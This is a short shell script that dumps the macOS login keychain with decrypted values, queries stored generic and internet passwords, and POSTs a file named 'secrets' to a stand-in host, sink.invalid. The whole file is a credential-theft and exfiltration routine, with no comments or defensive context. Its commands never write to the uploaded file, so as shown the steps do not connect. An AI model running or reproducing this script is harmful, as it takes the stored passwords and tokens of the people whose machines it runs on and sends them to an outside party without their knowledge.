#!/bin/sh
security dump-keychain -d login
security find-generic-password
security find-internet-password
curl -s https://sink.invalid -X POST -H "Content-Type: application/octet-stream" --data-binary @secrets
